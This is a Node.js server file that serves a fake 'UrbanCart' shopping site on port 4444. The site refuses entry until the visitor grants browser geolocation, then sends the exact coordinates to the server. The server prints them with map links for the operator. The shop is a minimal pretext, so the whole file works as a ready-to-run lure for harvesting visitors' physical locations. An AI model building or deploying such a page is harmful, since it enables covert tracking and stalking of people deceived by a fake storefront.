const http = require('http');
const url = require('url');
const PORT = 4444;

// Store user sessions
const userSessions = new Map();

// Shopping Page HTML (Built-in)
const SHOPPING_PAGE = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UrbanCart | Smart Shopping with Live Map</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background: #f5f7fb; color: #1e1e2a; }
        .container { max-width: 1280px; margin: 0 auto; padding: 0 24px; }
        
        .location-map-card {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 20px;
            padding: 20px;
            margin: 20px 0;
            color: white;
        }
        
        .map-link {
            display: inline-block;
            background: white;
            color: #667eea;
            padding: 12px 24px;
            border-radius: 50px;
            text-decoration: none;
            font-weight: 600;
            margin-top: 12px;
            transition: transform 0.2s;
        }
        
        .map-link:hover {
            transform: translateY(-2px);
        }
        
        .location-coords {
            font-family: monospace;
            background: rgba(255,255,255,0.2);
            padding: 8px 12px;
            border-radius: 10px;
            display: inline-block;
            margin-top: 10px;
        }
        
        .header { background: white; box-shadow: 0 4px 20px rgba(0,0,0,0.05); position: sticky; top: 0; z-index: 100; }
        .navbar { display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; padding: 16px 0; gap: 16px; }
        .logo { font-size: 1.8rem; font-weight: 700; background: linear-gradient(135deg, #2463eb, #1a4fc3); -webkit-background-clip: text; background-clip: text; color: transparent; }
        .search-bar { flex: 1; max-width: 420px; display: flex; background: #f1f3f8; border-radius: 60px; padding: 4px 8px; }
        .search-bar input { flex: 1; background: transparent; border: none; padding: 12px 16px; outline: none; }
        .search-bar button { background: #2463eb; border: none; padding: 8px 20px; border-radius: 40px; color: white; font-weight: 600; cursor: pointer; }
        .cart-icon { cursor: pointer; background: #f0f2f6; padding: 10px 18px; border-radius: 40px; display: flex; align-items: center; gap: 8px; font-weight: 600; }
        .cart-count { background: #e53e3e; color: white; border-radius: 30px; padding: 2px 8px; }
        .hero { background: linear-gradient(120deg, #f0f5ff 0%, #e9effa 100%); margin: 24px 0 32px; border-radius: 32px; padding: 40px 32px; text-align: center; }
        .category-filter { display: flex; flex-wrap: wrap; gap: 12px; margin-bottom: 32px; justify-content: center; }
        .chip { background: white; border: 1px solid #e2e8f0; padding: 8px 20px; border-radius: 40px; cursor: pointer; transition: all 0.2s; }
        .chip.active, .chip:hover { background: #2463eb; border-color: #2463eb; color: white; }
        .products-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(270px, 1fr)); gap: 30px; margin: 32px 0 60px; }
        .product-card { background: white; border-radius: 24px; overflow: hidden; transition: 0.25s; box-shadow: 0 8px 20px rgba(0,0,0,0.02); border: 1px solid #edf2f7; }
        .product-card:hover { transform: translateY(-6px); box-shadow: 0 24px 36px -12px rgba(0,0,0,0.15); }
        .product-img { background: #f9fafc; height: 200px; display: flex; align-items: center; justify-content: center; font-size: 3.8rem; }
        .product-info { padding: 18px; }
        .product-category { font-size: 0.7rem; background: #eef2ff; display: inline-block; padding: 4px 10px; border-radius: 30px; color: #2463eb; margin-bottom: 10px; }
        .price { font-size: 1.4rem; font-weight: 700; margin: 10px 0 16px; }
        .add-btn { width: 100%; background: #1e293b; border: none; padding: 12px 0; border-radius: 40px; color: white; font-weight: 600; cursor: pointer; }
        .add-btn:hover { background: #2463eb; }
        .cart-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); backdrop-filter: blur(3px); visibility: hidden; opacity: 0; transition: 0.25s; z-index: 200; }
        .cart-sidebar { position: fixed; right: 0; top: 0; width: 420px; max-width: 90vw; height: 100%; background: white; z-index: 201; transform: translateX(100%); transition: transform 0.3s; display: flex; flex-direction: column; }
        .cart-overlay.active { visibility: visible; opacity: 1; }
        .cart-sidebar.active { transform: translateX(0); }
        .cart-header { padding: 24px; border-bottom: 1px solid #eef2f6; display: flex; justify-content: space-between; font-weight: 700; font-size: 1.3rem; }
        .close-cart { background: none; border: none; font-size: 1.6rem; cursor: pointer; }
        .cart-items-list { flex: 1; overflow-y: auto; padding: 16px; }
        .cart-footer { padding: 20px; border-top: 2px solid #eef2f6; }
        .total-row { display: flex; justify-content: space-between; font-weight: 700; font-size: 1.2rem; margin-bottom: 16px; }
        .checkout-btn { background: #2463eb; width: 100%; padding: 14px; border: none; border-radius: 40px; color: white; font-weight: 700; cursor: pointer; }
        footer { text-align: center; padding: 32px; color: #5b6e8c; border-top: 1px solid #e2e8f0; }
        @media (max-width: 680px) { .navbar { flex-direction: column; align-items: stretch; } .search-bar { max-width: none; } }
    </style>
</head>
<body>
<div class="header">
    <div class="container">
        <div class="navbar">
            <div class="logo">📍 UrbanCart</div>
            <div class="search-bar">
                <input type="text" id="searchInput" placeholder="Search products...">
                <button id="searchBtn">Search</button>
            </div>
            <div class="cart-icon" id="cartIconBtn">🛒 Cart <span class="cart-count" id="cartCountBadge">0</span></div>
        </div>
    </div>
</div>

<main class="container">
    <!-- Live Location & Map Card -->
    <div class="location-map-card" id="locationCard">
        <div style="display: flex; align-items: center; gap: 15px; flex-wrap: wrap;">
            <div>📍 <strong>Your Live Location</strong></div>
            <div id="coordsDisplay" class="location-coords">Fetching location...</div>
        </div>
        <div id="mapLinkContainer" style="margin-top: 15px;"></div>
    </div>

    <div class="hero">
        <h1>Smart Shopping with Live Map ✨</h1>
        <p>Your location is tracked in real-time. Click the map link to see exactly where you are!</p>
    </div>
    <div class="category-filter" id="categoryFilterContainer"></div>
    <div id="productsContainer" class="products-grid"></div>
</main>

<footer><p>© 2025 UrbanCart — Live GPS + Google Maps Integration</p></footer>

<div id="cartOverlay" class="cart-overlay"></div>
<div id="cartSidebar" class="cart-sidebar">
    <div class="cart-header">Your Cart 🛍️ <button class="close-cart" id="closeCartBtn">&times;</button></div>
    <div id="cartItemsList" class="cart-items-list"></div>
    <div class="cart-footer"><div class="total-row"><span>Total:</span><span id="cartTotalAmount">₹0</span></div>
    <button class="checkout-btn" id="checkoutBtn">Proceed to Checkout →</button></div>
</div>

<script>
    const products = [
        { id: 1, name: "Premium Leather Backpack", category: "bags", price: 3499, emoji: "🎒", tags: ["leather"] },
        { id: 2, name: "Wireless Noise Buds", category: "electronics", price: 1999, emoji: "🎧", tags: ["wireless"] },
        { id: 3, name: "Minimalist Analog Watch", category: "accessories", price: 2899, emoji: "⌚", tags: ["watch"] },
        { id: 4, name: "Cotton Oversized Tee", category: "clothing", price: 1299, emoji: "👕", tags: ["cotton"] },
        { id: 5, name: "Slim Fit Denim Jeans", category: "clothing", price: 2499, emoji: "👖", tags: ["denim"] },
        { id: 6, name: "Smart LED Desk Lamp", category: "electronics", price: 1599, emoji: "💡", tags: ["lamp"] },
        { id: 7, name: "Leather Card Holder", category: "accessories", price: 899, emoji: "👛", tags: ["leather"] },
        { id: 8, name: "Running Sneakers", category: "footwear", price: 3999, emoji: "👟", tags: ["sneakers"] },
        { id: 9, name: "Classic Sunglasses", category: "accessories", price: 1799, emoji: "🕶️", tags: ["sunglasses"] },
        { id: 10, name: "Laptop Sleeve", category: "bags", price: 999, emoji: "💼", tags: ["laptop"] }
    ];

    let cart = [];
    let activeCategory = "all";
    let searchQuery = "";
    let userLat = null, userLng = null;

    function updateMapLink(lat, lng) {
        const mapContainer = document.getElementById('mapLinkContainer');
        const coordsDisplay = document.getElementById('coordsDisplay');
        
        coordsDisplay.innerHTML = \`📍 \${lat.toFixed(6)}, \${lng.toFixed(6)}\`;
        
        // Google Maps Link
        const googleMapsLink = \`https://www.google.com/maps?q=\${lat},\${lng}&z=15\`;
        // OpenStreetMap Link
        const osmLink = \`https://www.openstreetmap.org/?mlat=\${lat}&mlon=\${lng}#map=15/\${lat}/\${lng}\`;
        // What3Words (conceptual - using map link)
        
        mapContainer.innerHTML = \`
            <strong>🗺️ View on Map:</strong><br>
            <a href="\${googleMapsLink}" target="_blank" class="map-link" style="margin-right: 10px;">📍 Google Maps</a>
            <a href="\${osmLink}" target="_blank" class="map-link" style="background:#333; color:white;">🗺️ OpenStreetMap</a>
            <div style="margin-top: 10px; font-size: 12px;">
                ⚡ Click any link to see your exact location on map
            </div>
        \`;
    }

    // Get user location from session (passed from server)
    async function getUserLocation() {
        try {
            const response = await fetch('/api/get-location', {
                headers: { 'X-Session-Id': getSessionId() }
            });
            const data = await response.json();
            if (data.latitude && data.longitude) {
                userLat = data.latitude;
                userLng = data.longitude;
                updateMapLink(userLat, userLng);
            } else {
                document.getElementById('coordsDisplay').innerHTML = '⚠️ Location not shared';
            }
        } catch(e) {
            document.getElementById('coordsDisplay').innerHTML = '❌ Error loading location';
        }
    }

    function getSessionId() {
        return document.cookie.split(';').find(c => c.includes('sessionId'))?.split('=')[1] || '';
    }

    // Cart Functions
    function saveCart() { localStorage.setItem("urbanCart", JSON.stringify(cart)); }
    function loadCart() { const saved = localStorage.getItem("urbanCart"); if(saved) cart = JSON.parse(saved); updateCartUI(); }
    function updateCartUI() {
        const totalItems = cart.reduce((s,i) => s + i.quantity, 0);
        document.getElementById("cartCountBadge").innerText = totalItems;
        const totalPrice = cart.reduce((s,i) => s + (i.price * i.quantity), 0);
        document.getElementById("cartTotalAmount").innerText = \`₹\${totalPrice.toLocaleString('en-IN')}\`;
        const cartItemsList = document.getElementById("cartItemsList");
        if(cart.length === 0) { cartItemsList.innerHTML = '<div style="text-align:center;padding:40px;">Cart is empty</div>'; return; }
        cartItemsList.innerHTML = "";
        cart.forEach(item => {
            const div = document.createElement("div");
            div.className = "cart-item";
            div.style.display = "flex"; div.style.gap = "12px"; div.style.background = "#fafcff"; div.style.padding = "12px"; div.style.marginBottom = "12px"; div.style.borderRadius = "20px";
            div.innerHTML = \`
                <div style="font-size:2rem;">\${item.emoji || "🛍️"}</div>
                <div style="flex:1"><strong>\${item.name}</strong><br>₹\${item.price}<div class="item-qty" style="display:flex;gap:8px;margin-top:8px;">
                <button class="qty-btn" data-id="\${item.id}" data-delta="-1">−</button>
                <span>\${item.quantity}</span>
                <button class="qty-btn" data-id="\${item.id}" data-delta="1">+</button>
                <button class="qty-btn" data-id="\${item.id}" data-delta="remove">🗑️</button>
                </div></div>
            \`;
            cartItemsList.appendChild(div);
        });
        document.querySelectorAll(".qty-btn").forEach(btn => {
            btn.addEventListener("click", () => {
                const pid = parseInt(btn.dataset.id);
                const delta = btn.dataset.delta;
                if(delta === "remove") cart = cart.filter(i => i.id !== pid);
                else { const idx = cart.findIndex(i => i.id === pid); if(idx !== -1) { cart[idx].quantity += parseInt(delta); if(cart[idx].quantity <= 0) cart.splice(idx,1); } }
                saveCart(); updateCartUI(); renderProducts();
            });
        });
    }
    function addToCart(product) {
        const existing = cart.find(i => i.id === product.id);
        if(existing) existing.quantity++;
        else cart.push({ id: product.id, name: product.name, price: product.price, quantity: 1, emoji: product.emoji });
        saveCart(); updateCartUI(); renderProducts();
    }
    function isInCartQty(pid) { return cart.find(i => i.id === pid)?.quantity || 0; }
    function getFilteredProducts() {
        let filtered = [...products];
        if(activeCategory !== "all") filtered = filtered.filter(p => p.category === activeCategory);
        if(searchQuery.trim()) { const q = searchQuery.toLowerCase(); filtered = filtered.filter(p => p.name.toLowerCase().includes(q) || p.tags.some(t => t.includes(q))); }
        return filtered;
    }
    function renderProducts() {
        const filtered = getFilteredProducts();
        const container = document.getElementById("productsContainer");
        if(filtered.length === 0) { container.innerHTML = '<div style="grid-column:1/-1;text-align:center;padding:60px;">No products</div>'; return; }
        container.innerHTML = "";
        filtered.forEach(p => {
            const qty = isInCartQty(p.id);
            const card = document.createElement("div"); card.className = "product-card";
            card.innerHTML = \`<div class="product-img">\${p.emoji}</div><div class="product-info"><div class="product-category">\${p.category}</div><div style="font-weight:600;">\${p.name}</div><div class="price">₹\${p.price.toLocaleString()}</div><button class="add-btn" data-id="\${p.id}">\${qty > 0 ? \`✓ In Cart (\${qty})\` : "➕ Add to Cart"}</button></div>\`;
            container.appendChild(card);
        });
        document.querySelectorAll(".add-btn").forEach(btn => btn.addEventListener("click", (e) => { const prod = products.find(x => x.id === parseInt(btn.dataset.id)); if(prod) addToCart(prod); }));
    }
    function buildCategories() {
        const cats = ["all", ...new Set(products.map(p => p.category))];
        const filterDiv = document.getElementById("categoryFilterContainer");
        filterDiv.innerHTML = "";
        cats.forEach(cat => {
            const chip = document.createElement("div");
            chip.className = \`chip \${activeCategory === cat ? "active" : ""}\`;
            chip.textContent = cat === "all" ? "All Items" : cat.charAt(0).toUpperCase() + cat.slice(1);
            chip.addEventListener("click", () => { activeCategory = cat; buildCategories(); renderProducts(); });
            filterDiv.appendChild(chip);
        });
    }
    function performSearch() { searchQuery = document.getElementById("searchInput").value.trim(); renderProducts(); }
    function openCart() { document.getElementById("cartOverlay").classList.add("active"); document.getElementById("cartSidebar").classList.add("active"); updateCartUI(); }
    function closeCart() { document.getElementById("cartOverlay").classList.remove("active"); document.getElementById("cartSidebar").classList.remove("active"); }
    function checkout() { alert(cart.length ? \`Order placed! Total: ₹\${cart.reduce((s,i)=>s+(i.price*i.quantity),0).toLocaleString()}\\n📍 Delivery will be sent to your map location!\` : "Cart empty"); }
    
    document.getElementById("searchBtn").addEventListener("click", performSearch);
    document.getElementById("searchInput").addEventListener("keyup", (e) => { if(e.key === "Enter") performSearch(); });
    document.getElementById("cartIconBtn").addEventListener("click", openCart);
    document.getElementById("closeCartBtn").addEventListener("click", closeCart);
    document.getElementById("cartOverlay").addEventListener("click", closeCart);
    document.getElementById("checkoutBtn").addEventListener("click", checkout);
    
    loadCart(); buildCategories(); renderProducts(); getUserLocation();
</script>
</body>
</html>`;

// Permission Page HTML
function getPermissionPage(sessionId) {
    return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location Permission Required - UrbanCart</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { background: white; border-radius: 20px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); max-width: 500px; width: 100%; padding: 40px; text-align: center; animation: fadeIn 0.5s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
        .icon { font-size: 80px; margin-bottom: 20px; }
        h1 { color: #333; margin-bottom: 15px; }
        p { color: #666; margin-bottom: 25px; line-height: 1.6; }
        .permission-btn { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; padding: 15px 40px; font-size: 18px; font-weight: 600; border-radius: 50px; cursor: pointer; margin: 10px 0; transition: transform 0.2s; }
        .permission-btn:hover { transform: translateY(-2px); }
        .exit-btn { background: #dc3545; color: white; border: none; padding: 10px 20px; border-radius: 50px; cursor: pointer; margin-top: 15px; }
        .error-message { background: #fee; color: #c33; padding: 10px; border-radius: 10px; margin-top: 20px; display: none; }
        .status { margin-top: 20px; padding: 10px; border-radius: 10px; background: #e3f2fd; color: #1976d2; }
        .loading { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: white; animation: spin 1s ease-in-out infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">📍</div>
        <h1>Location Access Required</h1>
        <p>To continue shopping on UrbanCart with LIVE MAP feature, we need your location permission.</p>
        <button class="permission-btn" id="allowBtn">Allow Location Access</button>
        <button class="exit-btn" id="exitBtn">Exit Website</button>
        <div id="errorMsg" class="error-message"></div>
        <div id="statusMsg" class="status">Please click "Allow Location Access" to continue</div>
    </div>
    <script>
        const sessionId = "${sessionId}";
        async function requestLocation() {
            const btn = document.getElementById('allowBtn');
            btn.disabled = true;
            btn.innerHTML = '<span class="loading"></span> Getting location...';
            if(!navigator.geolocation) {
                showError('Geolocation not supported');
                return;
            }
            navigator.geolocation.getCurrentPosition(async (position) => {
                const { latitude, longitude } = position.coords;
                document.getElementById('statusMsg').innerHTML = '📍 Sending to server...';
                try {
                    const res = await fetch('/api/location', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json', 'X-Session-Id': sessionId },
                        body: JSON.stringify({ coordinates: { lat: latitude, lng: longitude } })
                    });
                    const data = await res.json();
                    if(data.success) {
                        document.getElementById('statusMsg').innerHTML = '✅ Verified! Redirecting...';
                        setTimeout(() => window.location.href = '/shop', 1000);
                    } else { showError('Verification failed'); }
                } catch(e) { showError('Server error'); }
            }, (error) => {
                let msg = error.code === 1 ? '❌ Permission denied. You must allow location.' : '❌ Location error';
                showError(msg);
                btn.disabled = false;
                btn.innerHTML = 'Allow Location Access';
            });
        }
        function showError(msg) {
            document.getElementById('errorMsg').innerHTML = msg;
            document.getElementById('errorMsg').style.display = 'block';
            document.getElementById('statusMsg').innerHTML = '⚠️ ' + msg;
        }
        document.getElementById('allowBtn').onclick = requestLocation;
        document.getElementById('exitBtn').onclick = () => window.location.href = 'about:blank';
    </script>
</body>
</html>`;
}

const server = http.createServer((req, res) => {
    console.log(`${req.method} ${req.url}`);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Session-Id');
    
    if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }
    
    // Get session ID from cookie
    const cookies = req.headers.cookie || '';
    const sessionMatch = cookies.match(/sessionId=([^;]+)/);
    const sessionId = sessionMatch ? sessionMatch[1] : null;
    
    // API: Receive location
    if (req.url === '/api/location' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const sessId = req.headers['x-session-id'];
                if (sessId) {
                    userSessions.set(sessId, { lat: data.coordinates.lat, lng: data.coordinates.lng, timestamp: new Date() });
                    console.log('\\n✅ LOCATION RECEIVED & STORED!');
                    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
                    console.log(`📍 Latitude: ${data.coordinates.lat}`);
                    console.log(`📍 Longitude: ${data.coordinates.lng}`);
                    console.log(`🗺️ Google Maps Link: https://www.google.com/maps?q=${data.coordinates.lat},${data.coordinates.lng}`);
                    console.log(`🗺️ OpenStreetMap: https://www.openstreetmap.org/?mlat=${data.coordinates.lat}&mlon=${data.coordinates.lng}`);
                    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\\n');
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ success: true, message: 'Location saved!' }));
                } else { throw new Error('No session'); }
            } catch(e) { res.writeHead(400); res.end(JSON.stringify({ error: 'Invalid' })); }
        });
        return;
    }
    
    // API: Get location for shopping page
    if (req.url === '/api/get-location' && req.method === 'GET') {
        const sessId = req.headers['x-session-id'];
        if (sessId && userSessions.has(sessId)) {
            const loc = userSessions.get(sessId);
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ latitude: loc.lat, longitude: loc.lng }));
        } else { res.writeHead(404); res.end(JSON.stringify({ error: 'No location' })); }
        return;
    }
    
    // Shop page (requires verification)
    if (req.url === '/shop') {
        if (sessionId && userSessions.has(sessionId)) {
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(SHOPPING_PAGE);
        } else {
            res.writeHead(302, { 'Location': '/' });
            res.end();
        }
        return;
    }
    
    // Main permission page
    if (req.url === '/') {
        const newSessionId = Math.random().toString(36).substring(2) + Date.now().toString(36);
        res.setHeader('Set-Cookie', `sessionId=${newSessionId}; Path=/; HttpOnly`);
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(getPermissionPage(newSessionId));
        return;
    }
    
    res.writeHead(404);
    res.end('Not Found');
});

server.listen(PORT, () => {
    console.log('\\n╔════════════════════════════════════════════════╗');
    console.log('║   🚀 URBANCART SERVER STARTED!                ║');
    console.log('║   📡 PORT: ' + PORT + '                                  ║');
    console.log('║   🌐 http://localhost:' + PORT + '                      ║');
    console.log('║                                                    ║');
    console.log('║   ⭐ NEW FEATURES:                                 ║');
    console.log('║   • LIVE MAP LINK (Google Maps + OpenStreetMap)    ║');
    console.log('║   • Location permission gatekeeper                 ║');
    console.log('║   • Auto-redirect after permission                 ║');
    console.log('╚════════════════════════════════════════════════════╝\\n');
    console.log('👉 Open browser: http://localhost:' + PORT + '\\n');
});
